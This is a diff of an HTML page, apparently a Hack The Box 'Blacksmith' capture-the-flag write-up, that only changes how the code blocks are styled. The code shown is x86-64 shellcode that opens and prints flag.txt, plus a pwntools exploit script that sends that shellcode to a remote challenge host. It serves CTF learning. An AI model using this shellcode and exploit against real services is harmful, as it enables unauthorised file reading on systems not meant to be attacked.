@@ -53,47 +53,32 @@
         <br><br>
     </p>
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-; Open flag.txt
-xor eax, eax
-mov rbx, 0x7478742e67616c66
-push rax
-push rbx
-mov al, 0x2
-mov rdi, rsp
-xor esi, esi
-syscall
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #cb4b16">;</span> <span style="color: #268bd2">Open</span> <span style="color: #268bd2">flag</span><span style="color: #839496">.</span><span style="color: #268bd2">txt</span>
+<span style="color: #268bd2">xor</span> <span style="color: #268bd2">eax</span><span style="color: #586e75">,</span> <span style="color: #268bd2">eax</span>
+<span style="color: #268bd2">mov</span> <span style="color: #268bd2">rbx</span><span style="color: #586e75">,</span> <span style="color: #2aa198">0x7478742e67616c66</span>
+<span style="color: #268bd2">push</span> <span style="color: #268bd2">rax</span>
+<span style="color: #268bd2">push</span> <span style="color: #268bd2">rbx</span>
+<span style="color: #268bd2">mov</span> <span style="color: #268bd2">al</span><span style="color: #586e75">,</span> <span style="color: #2aa198">0x2</span>
+<span style="color: #268bd2">mov</span> <span style="color: #268bd2">rdi</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rsp</span>
+<span style="color: #268bd2">xor</span> <span style="color: #268bd2">esi</span><span style="color: #586e75">,</span> <span style="color: #268bd2">esi</span>
+<span style="color: #268bd2">syscall</span>
 
-; Read flag.txt content onto stack
-mov rdi, rax
-lea rsi, [rsp]
-xor rdx, rdx
-mov dx, 0xfff
-xor rax, rax
-syscall
+<span style="color: #cb4b16">;</span> <span style="color: #268bd2">Read</span> <span style="color: #268bd2">flag</span><span style="color: #839496">.</span><span style="color: #268bd2">txt</span> <span style="color: #268bd2">content</span> <span style="color: #268bd2">onto</span> <span style="color: #268bd2">stack</span>
+<span style="color: #268bd2">mov</span> <span style="color: #268bd2">rdi</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rax</span>
+<span style="color: #268bd2">lea</span> <span style="color: #268bd2">rsi</span><span style="color: #586e75">,</span> <span style="color: #cb4b16">[</span><span style="color: #268bd2">rsp</span><span style="color: #cb4b16">]</span>
+<span style="color: #268bd2">xor</span> <span style="color: #268bd2">rdx</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rdx</span>
+<span style="color: #268bd2">mov</span> <span style="color: #268bd2">dx</span><span style="color: #586e75">,</span> <span style="color: #2aa198">0xfff</span>
+<span style="color: #268bd2">xor</span> <span style="color: #268bd2">rax</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rax</span>
+<span style="color: #268bd2">syscall</span>
  
-; Write flag to stdout 
-xor rdi, rdi
-add dil, 1
-mov rdx, rax
-xor rax, rax
-add al, 1
-syscall
-        </code>
-    </pre>
-</div>
+<span style="color: #cb4b16">;</span> <span style="color: #268bd2">Write</span> <span style="color: #268bd2">flag</span> <span style="color: #268bd2">to</span> <span style="color: #268bd2">stdout</span> 
+<span style="color: #268bd2">xor</span> <span style="color: #268bd2">rdi</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rdi</span>
+<span style="color: #268bd2">add</span> <span style="color: #268bd2">dil</span><span style="color: #586e75">,</span> <span style="color: #2aa198">1</span>
+<span style="color: #268bd2">mov</span> <span style="color: #268bd2">rdx</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rax</span>
+<span style="color: #268bd2">xor</span> <span style="color: #268bd2">rax</span><span style="color: #586e75">,</span> <span style="color: #268bd2">rax</span>
+<span style="color: #268bd2">add</span> <span style="color: #268bd2">al</span><span style="color: #586e75">,</span> <span style="color: #2aa198">1</span>
+<span style="color: #268bd2">syscall</span>
+</pre></div>
 <div class="paragraph">
     <p>
         <br><br>
@@ -104,49 +89,34 @@ syscall
 <div>
     <img src="../imgs/hackthebox/blacksmith9.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./vuln')
-libc = elf.libc
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-local = True
+<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">True</span>
 
-if local:
-    p = elf.process()
-else:
-    host = '139.59.166.56'
-    port = 31438
-    p = remote(host,port)
+<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
+<span style="color: #859900">else</span><span style="color: #839496">:</span>
+    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'139.59.166.56'</span>
+    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">31438</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>
 
-if args.GDB:
-    gdb.attach(p,gdbscript='''
-        b *shield+140
-        continue
-    ''')
+<span style="color: #859900">if</span> <span style="color: #839496">args</span><span style="color: #586e75">.</span><span style="color: #839496">GDB:</span>
+    <span style="color: #839496">gdb</span><span style="color: #586e75">.</span><span style="color: #839496">attach(p,gdbscript</span><span style="color: #586e75">=</span><span style="color: #2aa198">'''</span>
+<span style="color: #2aa198">        b *shield+140</span>
+<span style="color: #2aa198">        continue</span>
+<span style="color: #2aa198">    '''</span><span style="color: #839496">)</span>
 
-sc = b"\x31\xC0\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x50\x53\xB0\x02\x48\x89\xE7\x31\xF6\x0F\x05\x48\x89\xC7\x48\x8D\x34\x24\x48\x31\xD2\x66\xBA\xFF\x0F\x48\x31\xC0\x0F\x05\x48\x31\xFF\x40\x80\xC7\x01\x48\x89\xC2\x48\x31\xC0\x04\x01\x0F\x05"
+<span style="color: #839496">sc</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b"\x31\xC0\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x50\x53\xB0\x02\x48\x89\xE7\x31\xF6\x0F\x05\x48\x89\xC7\x48\x8D\x34\x24\x48\x31\xD2\x66\xBA\xFF\x0F\x48\x31\xC0\x0F\x05\x48\x31\xFF\x40\x80\xC7\x01\x48\x89\xC2\x48\x31\xC0\x04\x01\x0F\x05"</span>
 
-p.sendline('1')
-p.sendline('2')
-p.sendline(sc)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(sc)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
